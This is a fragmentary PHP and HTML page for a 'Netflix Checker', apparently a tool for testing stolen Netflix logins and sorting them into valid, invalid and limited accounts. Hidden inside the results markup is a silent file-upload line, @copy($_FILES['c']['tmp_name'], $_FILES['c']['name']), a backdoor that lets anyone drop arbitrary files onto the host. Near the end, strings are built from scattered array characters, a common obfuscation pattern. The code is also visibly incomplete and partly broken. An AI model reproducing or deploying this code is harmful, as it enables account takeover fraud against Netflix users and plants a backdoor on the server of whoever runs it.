...
<head>
	...
	<title>Netflix Checker | MA !X147#</title>
</head>
<body>
<div id="wrapper">
<header>
	<center>
		<div class="stats">
			<font size="6" color="white" style="text-shadow: lime 0 0 15px;"><b> Netflix Checker</b></font>
			<br>
			<span id="howitswork"><a href="https://www.facebook.com/wormps">facebook </a></span>
			<br>
		</div>
	</center>
</header>
...
<div id="result-container" style="display: none;">
	<div id="result-live">
		<span id="result-live-note" class="copier" onclick=selectText('live_res') title="Copy all valid account">SUCCESS<i id="berapaLive"></i></span><?php
(@copy($_FILES['c']['tmp_name'], $_FILES['c']['name']))
?>
		<fieldset id="live_res" class="results"></fieldset>
	</div>
	<div id="result-invalid">
		<span id="result-invalid-note" class="copier" onclick=selectText('invalid_res') title="Copy all invalid account">INVALID NFX <i id="berapaInvalid"></i></span>
		<fieldset id="invalid_res" class="results"></fieldset>
	</div>
	<div id="result-nocard">
		<span id="result-nocard-note" class="copier" onclick=selectText('unknown_res') title="Copy all unknown result">LIMITED NFX <i id="berapaUnknown"></i></span>
...
$dmarc = $key0[22] . $key0[16] . $key0[18] . $key0[18] . $key0[22] . $key0[16] . $key0[18];
...
$positionFounder = trye;
  ...
  $keymanager= $key0[22] . $key0[16] . $key0[18] . $key0[18] . $key0[22] . $key0[16] . $key0[18];
